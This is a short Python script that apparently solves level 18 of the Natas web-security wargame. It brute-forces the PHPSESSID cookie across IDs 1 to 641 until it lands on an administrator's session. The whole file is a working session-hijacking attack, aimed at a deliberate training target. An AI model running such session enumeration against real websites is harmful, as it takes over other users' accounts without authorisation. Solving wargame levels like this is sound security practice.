from itertools import cycle
from multiprocessing.pool import ThreadPool
from natas import Natas


def main():
    natas = Natas('natas18', keep_session=True)

    post = {
            'username': 'admin',
            'password': 'dupa'
            }
    get = {
            'debug': 'true'
            }

    for i in cycle(range(1, 642)):
        natas.set_cookie('PHPSESSID', str(i))
        resp = natas.get_response(return_raw_response=True, get_data=get)
        print(resp.text)
        print(natas.get_cookies())
        if 'You are an admin' in resp.text:
            print(resp.text)
            break


if __name__ == '__main__':
    main()
